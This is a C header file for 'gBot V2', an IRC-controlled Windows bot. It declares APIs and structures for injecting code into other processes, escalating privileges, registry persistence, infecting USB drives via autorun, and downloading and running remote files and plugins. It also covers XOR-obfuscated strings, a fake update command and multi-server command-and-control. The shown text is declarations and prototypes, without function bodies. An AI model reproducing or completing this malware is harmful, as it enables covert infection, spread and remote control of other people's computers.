/*
	Proj: gBot V2
	By  : jam3s & fubar
*/

#if !defined(AFX_STDAFX_H__84D2778A_D53E_4729_B86C_E05719AA60DF__INCLUDED_)
#define AFX_STDAFX_H__84D2778A_D53E_4729_B86C_E05719AA60DF__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif

/* Pragmas */
#pragma comment(linker, "/IGNORE:4172")
#pragma comment(linker, "/IGNORE:4244")
#pragma comment(linker, "/IGNORE:4018")
#pragma comment (linker, "/SUBSYSTEM:WINDOWS")

/* Defines */
//#define _DEBUGLITE

//#define _HASANTIS
// #define is a macro, u can define a variable basically
// using #ifdef _HASANTI will check and IF u have defined it then it will do whats between the
// #ifdef and #endif got wo
// you can also do #ifndef and #endif which means IF NOT defined then ....
// its better than using a boolean variable because it will tell the compiler
// NOT to add the code to the binary. = save size... and crackability - wud
// take someone 1 minute to change a 0 to a 1... (Y)

#define CSIDL_APPDATA                      0x001A
#define CSIDL_WINDOWS                      0x0024
#define CSIDL_SYSTEM                       0x0025

#define _WIN32_WINNT 0x500
#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
#define INVALID_FILE_ATTRIBUTES ((DWORD)-1) 

#define BOT_VERSION "2.0.42"

#define GEN_SPACE " "
#define BOT_MAXCMDS 16
#define BOT_SPEEDTESTPORT 53
#define BOT_SPEEDTESTLEN 10
#define GEN_QUOTE "\""
#define GEN_BACKSLASH		"\\"
#define GEN_NEWLINE			"\r\n"

/* Includes */
#include <windows.h>
#include <stdio.h>
#include <TLHELP32.H>
#include <winsock.h>
#include <urlmon.h>
#include <wininet.h>
#include <malloc.h>

#include "Configuration.h"
#ifdef _HASANTIS
	#include "Antis.h"
#endif



struct _Injdata;

/* Function Pointers */
// Shell32.dll
typedef HRESULT (WINAPI *SHGF)(HWND, int, HANDLE, DWORD, LPTSTR);										// SHGetFolderPathA
typedef HINSTANCE (WINAPI *SE32)(HWND, LPCTSTR, LPCTSTR, LPCTSTR, LPCTSTR, INT);						// ShellExecuteA
// urlmon.dll
typedef HRESULT (WINAPI *OUAS)(DWORD, LPCSTR, DWORD *);													// ObtainUserAgentString
// User32.dll
typedef void (WINAPI *kbde)(BYTE, BYTE, DWORD, DWORD);													// keybd_event
typedef int (WINAPI *MB)(HWND, LPCTSTR, LPCTSTR, UINT);													// MessageBox
// Advapi32.dll
typedef BOOL (WINAPI *OPT)(HANDLE, DWORD, PHANDLE);														// OpenProcessToken
typedef BOOL (WINAPI *LPV)(LPCTSTR, LPCTSTR, PLUID);													// LookupPrivilegeValueA
typedef BOOL (WINAPI *ATP)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);			// AdjustTokenPrivileges
typedef LONG (WINAPI *REKE)(HKEY, DWORD, LPTSTR, LPDWORD, LPDWORD, LPTSTR, LPDWORD, PFILETIME);			// RegEnumKeyExA
typedef LONG (WINAPI *RDK)(HKEY, LPCTSTR);																// RegDeleteKeyA
typedef LONG (WINAPI *ROKE)(HKEY, LPCTSTR, DWORD, REGSAM, PHKEY);										// RegOpenKeyExA
typedef LONG (WINAPI *RQVE)(HKEY, LPCTSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);							// RegQueryValueExA
typedef LONG (WINAPI *RCK)(HKEY);																		// RegCloseKey
typedef LONG (WINAPI *RSVE)(HKEY, LPCTSTR, DWORD, DWORD, const BYTE *, DWORD);							// RegSetValueExA
typedef LONG (WINAPI *RCKE)(HKEY, LPCTSTR, DWORD, LPTSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY,
							LPDWORD);																	// RegCreateKeyExA
// Kernel32.dll
typedef HANDLE (WINAPI *CRNP)(LPCTSTR, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, LPSECURITY_ATTRIBUTES);// CreateNamedPipeA
typedef BOOL (WINAPI *CONP)(HANDLE, LPOVERLAPPED);														// ConnectNamePipe
typedef BOOL (WINAPI *FFB)(HANDLE);																		// FlushFileBuffers
typedef BOOL (WINAPI *DNP)(HANDLE);																		// DisconnectNamedPipe
typedef BOOL (WINAPI *RF)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);								// ReadFile
typedef BOOL (WINAPI *FC)(HANDLE);																		// FindClose
typedef HANDLE (WINAPI *FFF)(LPCTSTR, LPWIN32_FIND_DATA);												// FindFirstFileA
typedef BOOL (WINAPI *FNF)(HANDLE, LPWIN32_FIND_DATA);													// FindNextFileA
typedef BOOL (WINAPI *GFS)(HANDLE, LPDWORD);															// GetFileSize
typedef HANDLE (WINAPI *GCP)(void);																		// GetCurrentProcess
typedef LPVOID (WINAPI *VAEX)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);									// VirtualAllocEx
typedef BOOL (WINAPI *VPEX)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);										// VirtualProtectEx
typedef BOOL (WINAPI *WPM)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);									// WriteProcessMemory
typedef HANDLE (WINAPI *CTL)(DWORD dwFlags, DWORD th32ProcessID);										// CreateToolhelp32Snapshot
typedef BOOL (WINAPI *P32N)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);									// Process32Next
typedef BOOL (WINAPI *P32F)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);									// Process32First
typedef HANDLE (WINAPI *OP)(DWORD, BOOL, DWORD);														// OpenProcess
typedef int (WINAPI *WCTMB)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);						// WideCharToMultiByte
typedef HANDLE (WINAPI *CRT)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD); // CreateRemoteThread
typedef BOOL (WINAPI *RMTEX)(HANDLE);																	// ReleaseMutex
typedef HANDLE (WINAPI *CMTEX)(LPSECURITY_ATTRIBUTES, BOOL, LPCTSTR);									// CreateMutexA
typedef BOOL (WINAPI *DELF)(LPCTSTR);																	// DeleteFileA
typedef DWORD (WINAPI *GLE)(void);																		// GetLastError
typedef BOOL (WINAPI *CPYF)(LPCTSTR, LPCTSTR, BOOL);													// CopyFileA
typedef BOOL (WINAPI *SFA)(LPCTSTR, DWORD);																// SetFileAttributesA
typedef BOOL (WINAPI *CD)(LPCTSTR, LPSECURITY_ATTRIBUTES);												// CreateDirectoryA
typedef UINT (WINAPI *GDT)(LPCTSTR);																	// GetDriveTypeA
typedef DWORD (WINAPI *GLDS)(DWORD, LPTSTR);															// GetLogicalDriveStringsA
typedef DWORD (WINAPI *GFA)(LPCTSTR);																	// GetFileAttributesA
typedef HMODULE (WINAPI *GMH)(LPCTSTR);																	// GetModuleHandleA
typedef DWORD (WINAPI *GMF)(HMODULE, LPTSTR, DWORD);													// GetModuleFileNameA
typedef void (WINAPI *SL)(DWORD);																		// Sleep
typedef DWORD (WINAPI *GTC)(void);																		// GetTickCount
typedef LPTSTR (WINAPI *LCAT)(LPTSTR, LPTSTR);															// lstrcatA
typedef LPTSTR (WINAPI *LCPY)(LPTSTR, LPTSTR);															// lstrcpyA
typedef INT (WINAPI *LSTL)(LPCTSTR);																	// lstrlenA
typedef int (WINAPI *LSTCMP)(LPCTSTR,LPCTSTR);															// lstrcmpA
typedef LPTSTR (WINAPI *LCPYN)(LPTSTR, LPCTSTR, int);													// lstrcpynA
typedef HANDLE (WINAPI *CF)(LPCTSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);				// CreateFileA
typedef BOOL (WINAPI *WF)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);									// WriteFile
typedef BOOL (WINAPI *CH)(HANDLE);																		// CloseHandle
typedef HANDLE (WINAPI *CT)(LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);  // CreateThread
typedef BOOL (WINAPI *TT)(HANDLE, DWORD);																// TerminateThread
typedef void (WINAPI *ET)(DWORD);																		// ExitThread
typedef void (WINAPI *EP)(UINT);																		// ExitProcess
typedef DWORD (WINAPI *WFSO)(HANDLE,DWORD);																// WaitForSingleObject
typedef HMODULE (WINAPI *LLIB)(LPCTSTR);																// LoadLibraryA
typedef BOOL (WINAPI *FLIB)(HMODULE);																	// FreeLibrary
typedef void (WINAPI *ODBG)(LPCTSTR);																	// OutputDebugStringA
typedef BOOL (WINAPI *CP)(LPCTSTR, LPTSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, 
						  LPVOID, LPCTSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);						// CreateProcessA

// Wininet.dll
typedef HINTERNET (WINAPI *INOP)(LPCTSTR,DWORD,LPCTSTR,LPCTSTR,DWORD);  								// InternetOpen
typedef HINTERNET (WINAPI *INOU)(HINTERNET,LPCTSTR,LPCTSTR,DWORD,DWORD, DWORD);						    // InternetOpenURL
typedef BOOL (WINAPI *INCH)(HINTERNET);																	// InternetCloseHandle
typedef BOOL (WINAPI *INRF)(HINTERNET, LPVOID, DWORD, LPDWORD);											// InternetReadFile
typedef BOOL (WINAPI *DUCE)(LPCTSTR);																	// DeleteUrlCacheEntry
// Ws2_32.dll
typedef int (WINAPI *WSAS)(WORD,LPWSADATA);																// WSAStartup
typedef SOCKET (WINAPI *SOCK)(int,int,int);																// socket
typedef int (WINAPI *CON)(SOCKET,const struct sockaddr *,int);											// connect
typedef unsigned long (WINAPI *IADDR)(const char *);													// inet_addr
typedef u_short (WINAPI *HTONS)(u_short);																// htons
typedef int (WINAPI *SEND)(SOCKET,const char *,int,int);												// send
typedef int (WINAPI *RECV)(SOCKET,char *,int,int);														// recv
typedef int (WINAPI *CLSO)(SOCKET);																		// closesocket
typedef struct hostent* FAR (WINAPI *GHBN)(const char *);												// gethostbyname
typedef int (WINAPI *SENDTO)(SOCKET,const char*,int,int,const struct sockaddr*,int);					// sendto
typedef u_long (WINAPI *HTONL)(u_long);																	// htonl

// gBot Threads
typedef DWORD (WINAPI *threads)(_Injdata * v);

/* Structs */
typedef struct _OSVERSIONINFOEX {
	DWORD dwOSVersionInfoSize;
	DWORD dwMajorVersion;
	DWORD dwMinorVersion;
	DWORD dwBuildNumber;
	DWORD dwPlatformId;
	TCHAR szCSDVersion[128];
	WORD  wServicePackMajor;
	WORD  wServicePackMinor;
	WORD  wSuiteMask;
	BYTE  wProductType;
	BYTE  wReserved;
} NOSVERSIONINFOEX, *NPOSVERSIONINFOEX, *NLPOSVERSIONINFOEX;

typedef struct _Injapi
{
	kbde keybd_event;
	DUCE DeleteUrlCacheEntry;
	RF ReadFile;
	DNP DisconnectNamedPipe;
	CRNP CreateNamedPipe;
	CONP ConnectNamedPipe;
	FFB FlushFileBuffers;
	FC FindClose;
	FFF FindFirstFile;
	FNF FindNextFile;
	SHGF SHGetFolderPath;
	GFS GetFileSize;
	GCP GetCurrentProcess;
	OPT OpenProcessToken;
	LPV LookupPrivilegeValueA;
	ATP AdjustTokenPrivileges;
	VAEX VirtualAllocEx;
	VPEX VirtualProtectEx;
	WPM WriteProcessMemory;
	CTL CreateToolhelp32Snapshot;
	P32F Process32First;
	P32N Process32Next;
	OP OpenProcess;
	WCTMB WideCharToMultiByte;
	SE32 ShellExecute;
	CRT CreateRemoteThread;
	OUAS ObtainUserAgentString;
	REKE RegEnumKeyEx;
	RDK RegDeleteKey;
	ROKE RegOpenKeyEx;
	RQVE RegQueryValueEx;
	RCK RegCloseKey;
	RSVE RegSetValueEx;
	RCKE RegCreateKeyEx;
	RMTEX ReleaseMutex;
	CMTEX CreateMutex;
	DELF DeleteFile;
	GLE GetLastError;
	CPYF CopyFile;
	CD CreateDirectory;
	SFA SetFileAttributes;
	GDT GetDriveType;
	GLDS GetLogicalDriveStrings;
	GFA GetFileAttributes;
	GMH GetModuleHandle;
	GMF GetModuleFileName;
	ODBG OutputDebugString;
	CP CreateProcess;
	EP ExitProcess;
	LLIB LoadLibrary;
	FLIB FreeLibrary;
	WSAS WSAStartup;
	SOCK socket;
	CON connect;
	IADDR inet_addr;
	HTONS htons;
	SEND send;
	RECV recv;
	CLSO closesocket;
	GHBN gethostbyname;
	SENDTO sendto;
	HTONL htonl;
	CT CreateThread;
	TT TerminateThread;
	ET ExitThread;
	WFSO WaitForSingleObject;
	LSTCMP lstrcmp;
	LCAT lstrcat;
	LCPY lstrcpy;
	LSTL lstrlen;
	LCPYN lstrcpyn;
	SL	 Sleep;
	MB	 MessageBox;
	GTC  GetTickCount;
	CF	 CreateFile;
	WF	 WriteFile;
	CH	 CloseHandle;
	INOP InternetOpen;
	INOU InternetOpenURL;
	INCH InternetCloseHandle;
	INRF InternetReadFile;
} Injapi;

typedef struct _Injvarmsg
{
	char szMsg_Started[64];
	char szMsg_WSAFailed[64];
	char szMsg_WSAStarted[64];
	char szMsg_SocketFailed[64];
	char szMsg_ConnectFailed[64];
	char szMsg_Connected[64];
	char szMsg_Downloaded[64];
	char szMsg_DownloadFailed[64];
	char szMsg_Reconnecting[32];
	char szMsg_Executed[64];
	char szMsg_ExecuteFailed[64];
	char szMsg_Quitting[32];
	char szMsg_InjectedInto[MAX_PATH];
	char szMsg_UsingOS[32];
	char szMsg_UsingVER[32];
	char szMsg_Version[64];
	char szMsg_FileProtNoURL[128];
	char szMsg_FileProtNoBot[128];
	char szMsg_FileProtCantFind[128];
	char szMsg_FileProtBotFound[128];
	char szMsg_FileProtStarted[128];
	char szMsg_FileProtStopped[128];
	char szMsg_FileProtAlready[128];
	char szMsg_FileProtWith[128];
	char szMsg_FileProtRepaired[128];
	char szMsg_FileProtRepairErr[128];
	char szMsg_SpeedtestError[64];
	char szMsg_SpeedtestResult[64];
	char szMsg_InjectTo[64];
	char szMsg_InjectToFail[64];
	char szMsg_InjectDie[64];
	char szMsg_BotLocated[64];
	char szMsg_USBInfected[64];
	char szMsg_Updating[64];
	char szMsg_UpdateFail[128];
	char szMsg_Removing[128];
	char szMsg_RegMonNotFound[128];
	char szMsg_RegMonAdded[128];
	char szMsg_RegMonAddErr[128];
	char szMsg_VisitOK[128];
	char szMsg_VisitFail[128];
	char szMsg_InstallingPlugin[128];
	char szMsg_DownloadPlugin[128];
	char szMsg_PluginError[128];
	char szMsg_UsingArch[128];
	char szTitle_gBot[16];
} Injvarmsg;

typedef struct _Injvarsettings
{
	HANDLE hMutex;
	char szDNS_Pass[MAX_PATH];
	char szBotRegistryKey[MAX_PATH];
	char szBotPath[MAX_PATH];
	char szBotUser[128];
	char szBotVersion[128];
	char szPath[MAX_PATH];
	char szDNS1[MAX_PATH];
	long lPort1;
	char szDNS2[MAX_PATH];
	long lPort2;
	char szDNS3[MAX_PATH];
	long lPort3;
	char szDNS4[MAX_PATH];
	long lPort4;
	char szDNS5[MAX_PATH];
	long lPort5;
	long lConnectAttempts;
	char szChannel[MAX_PATH];
	char szChanPass[MAX_PATH];
	char szMutex[MAX_PATH];
	char szIPCName[MAX_PATH];
	char szMasterHost[512];
	char szPrefix[8];
	long lMaxCmds;
} Injvarsettings;

typedef struct _Injvarfileprotection
{
	HANDLE hThread;
	HANDLE hRegMon;
	char szFilePath[MAX_PATH];
	char szDownloadURL[MAX_PATH];
	char szStartedFrom[MAX_PATH];
	DWORD dwFileSize;
	int Silent;
	bool bStatus;
} Injvarfileprotection;

typedef struct _Injvardownloader
{
	HANDLE hThread;
	HANDLE hPluginThread;
	char szPluginParams[1024];
	char szURL[MAX_PATH];
	char szSavedPath[MAX_PATH];
	char szFrom[MAX_PATH];
	int Silent;
	int iMode;
} Injvardownloader;

typedef struct _Injvarirc
{
	HANDLE hThread;
	WSAData wsaData;
	SOCKET sckIRC;
} Injvarirc;

typedef struct _Injvardlls
{
	char szWinsock[MAX_PATH];
	char szWininet[MAX_PATH];
	char szShell32[MAX_PATH];
	char szAdvapi[MAX_PATH];
	char szUser32[MAX_PATH];
} Injvardlls;

typedef struct _Injvarfolders
{
	char szAppData[MAX_PATH];
	char szSystemDir[MAX_PATH];
	char szWindowsDir[MAX_PATH];
	char szUSBFolder[MAX_PATH];
	char szRegistryFolder[MAX_PATH];
	char szRegistryKey[MAX_PATH];
	char szBrowserKey[MAX_PATH];
	char szCurrentVersion[512];
} Injvarfolders;

typedef struct _Injvarspacers
{
	char szBackslash[8];
	char szEXEExtension[32];
	char szPluginExtension[32];
} Injvarspacers;

typedef struct _Injvarcommands
{
	char szVersion[8];
	char szExit[8];
	char szDownload[8];
	char szReconnect[8];
	char szInfo[8];
	char szFileProtection[8];
	char szSpeedTest[8];
	char szInject[8];
	char szPath[8];
	char szUpdate[8];
	char szRemove[8];
	char szSort[8];
	char szUSort[8];
	char szVisit[8];
	char szPlugin[8];
	char szFakeUpdate[8];
	char szJoin[8];
	char szPart[8];
} Injvarcommands;

typedef struct _Injvarothers
{
	HANDLE hIPC;
	char    szPASS[32];
	char    szArchType[8];
	char    szArchitecture[8];
	char    szXP[8];
	char    szNoMOTD[8];
	char    szQuote[8];
	char    szParamPlugin[8];
	char    szOPEN[8];
	char	szChanPrefix[4];
	char    szMute[4];
	char	szSilent[4];
	char    szNewUSB[8];
	char	szParamUSB[8];
	char	szIsUSBInfect[8];
	char	szNickBegin[3];
	char	szNickClose[3];
	char	szNewBotPrefix[32];
	char	szAmINew[32];
	char	szBotNickPrefix[64];
	long	holdrand;
	char	szParamInject[8];
	char	szKBS[8];
	char	szMBS[8];
	char	szUserAgent[512];
	char	szCountry[8];
	char	szOperatingSystem[32];
	char	szFullOperatingSystem[MAX_PATH];
	char	szUserType[32];
	char	szBlank[2];
	char	szNewLine[2];
	char    szCR;
	char    szLF;
	char	szNICK[32];
	char	szUSER[32];
	char	szUSERMiddle[4];
	char	szJOIN[32];
	char    szPART[32];
	char	szMOTD[32];
	char	szPONG[32];
	char	szPING[32];
	char	szQUIT[32];
	char	szColon[2];
	char	szSpace[2];
	char	szNICKINUSE[8];
	char	szPRIVMSG[16];
	char	szTOPIC[16];
	char	szNickSplit[8];
	char	szBotVersion[MAX_PATH];
	char	szUSBShellExecute[128];
	char	szUSBIcon[128];
	char	szUSBAction[128];
	char	szUSBShellOpen[128];
	char	szUSBShellCmd[128];
	char	szUSBShellDefault[128];
	char	szUSBAutoplay[64];
	char	szUSBInfFile[64];
	char	szUSBHeader[64];
	char	szUSBFolder[MAX_PATH];
	char	szUSBSubdir[MAX_PATH];
	char	szOFF[8];
	char	szON[8];
	char    szTimes[32];
} Injvarothers;

typedef struct _Injvarspeedtest
{
	HANDLE hThread;
	SOCKET sock;
	struct sockaddr_in recvaddr;
	char szTestAgainst[MAX_PATH];
	long lPort;
	char szFrom[MAX_PATH];
	int iSeconds;
	int iMin;
} Injvarspeedtest;

typedef struct _Injvarusb
{
	HANDLE hThread;
	char szBotPath[MAX_PATH];
	char szInfPath[MAX_PATH];
	char szFirstDir[MAX_PATH];
	char szSubDir[MAX_PATH];
	char szUSBData[32768];
	char szUSBRand[16384];
	char szUSBFinalRand[16384];
} Injvarusb;

typedef struct _Injvar
{
	Injvardlls				DLLs;
	Injvarmsg				Messages;
	Injvarsettings			Settings;
	Injvarfolders			Folders;
	Injvarspacers			Spacers;
	Injvarothers			Others;
	Injvardownloader		Downloader;
	Injvarirc				IRC;
	Injvarcommands			Commands;
	Injvarfileprotection	FileProtection;
	Injvarspeedtest			Speedtest;
	Injvarusb				USB;
} Injvar;

typedef struct _Injthreads
{
	threads gBot;
	threads Downloader;
	threads IRCThread;
	threads FileProtection;
	threads Speedtest;
	threads USBThread;
	threads RegProtection;
	threads PluginGrab;
	threads IPC;
} Injthreads;

typedef struct _Injdata
{
	Injthreads Threads;
	Injapi API;
	Injvar Vars;
} Injdat;

typedef struct _Injplugin
{
	LLIB LoadLibrary;
	FLIB FreeLibrary;
	ET   ExitThread;
	threads LoadPlugin;
	char szPluginPath[MAX_PATH];
} Injplugin;

/* Defines */
#define VER_NT_WORKSTATION	0x0000001

/* Prototypes */

// - gBot.cpp
// -- Lib Functions
_inline void *bmemset(void *p, int c, size_t n);
_inline char *bstrchr(const char *s, int ch);
_inline int bstrncmp(const char *s1, const char *s2, size_t count);
_inline void bsrand(long *holdrand, unsigned int seed);
_inline int brand(long *holdrand);
_inline char *strtok(char *_str, const char*delim);
_inline char *strstr(const char *str1, const char *str2);
_inline char *strncpy(char *dst, const char *src, size_t n);
_inline char *strreplace(char *str, char *orig, char *rep);
_inline void *mmalloc(size_t Size);
_inline int batoi(char *str);
_inline char* bitoa (int n);

// -- gBot Functions
BOOL RegDelnode (HKEY hKeyRoot, LPTSTR lpSubKey);
BOOL RegDelnodeRecurse (HKEY hKeyRoot, LPTSTR lpSubKey);
int deckey(char Key[33]);
char *sexor(char *string, char *decode_key);
size_t wcslen(const wchar_t * s);
bool Start_gBot(char *szStartIn, char *szBotPath);
bool Start_Plugin(char *szProcessName, char *szPluginPath);

PDWORD inject(HANDLE hProcess, LPVOID ThreadStart, DWORD cboSize);
char *GetOperatingSystem(Injdat *pInj);
char *GetCountry();
// - Remote Threads
DWORD _stdcall Remote_gBot(LPVOID injStr);
DWORD _stdcall Remote_RegProtect(LPVOID injStr);
DWORD _stdcall Remote_Downloader(LPVOID injStr);
DWORD _stdcall Remote_FileProtection(LPVOID injStr);
DWORD _stdcall Remote_Speedtest(LPVOID injStr);
DWORD _stdcall Remote_USBThread(LPVOID injStr);
DWORD _stdcall Remote_LoadPlugin(LPVOID injStr);
DWORD _stdcall Remote_PluginGrabber(LPVOID injStr);
DWORD _stdcall Remote_IPC(LPVOID injStr);

// - Remote Functions
_inline char *RandomPluginPath(Injdat *pInj, char *szPath);
_inline char *RandomPath(Injdat *pInj, char *szPath);
_inline void xorusb(LPVOID injStr, char *string, char *decode_key);
_inline void xor(LPVOID injStr, char *string, char *decode_key);
_inline void rand_line(LPVOID injStr, char *szLineBuffer);
_inline void RandomCase(LPVOID injStr, char *pszText);
_inline BOOL Infect_USB(LPVOID injStr, char *szDrive);
_inline void GenerateNick(Injdat *pInj, char *szNick);
_inline BOOL RunFile(Injdat *pInj, char *szFile, int Mode);
_inline BOOL GrabFile(Injdat *pInj, char *szURL);
_inline BOOL GrabBot(Injdat *pInj, char *szURL, char *szSaveTo);
_inline unsigned int Resolve(LPVOID injStr, char *host);
_inline void Add_CRLF(Injdat *pInj, char *szData);
_inline void Clear_Var(Injdat *pInj, char *szData);

_inline int IRC_Connect(LPVOID injStr, char *host, unsigned short port);
_inline int IRC_Login(LPVOID injStr, SOCKET sock);
_inline char *IRC_IsOrder(LPVOID injStr, char *order);
_inline int IRC_Parse(LPVOID injStr, SOCKET sock, char *line);
_inline int IRC_ParseAllCommands(LPVOID injStr, SOCKET sock, char **word, int i);
_inline int IRC_ParseSingleCommand(LPVOID injStr, SOCKET sock, char **word, int p, char *from);
_inline void Send_PRIVMSG(Injdat *pInj, char *szDestination, char *szMessage);
_inline void Send_QUIT(Injdat *pInj, char *szDestination, char *szMessage);
_inline void Send_INFO(Injdat *pInj, char *szDestination);

// - Functions.cpp
BOOL is_64();
char tolower(char c);
char *strtolower(char *str);
void EnableDebugPriv();
bool key_exists(Injdat pInj, HKEY tree, const char *folder, char *key);
int reg_edit(Injdat pInj, HKEY tree, DWORD dwKeyType, char *szKeyPath, char *szKeyName, BYTE *bKeyValue);
bool is_new(Injdat pInj);
int do_startup(Injdat pInj, char *szLocation, char *szBotRunKey, int Bit);

#endif 
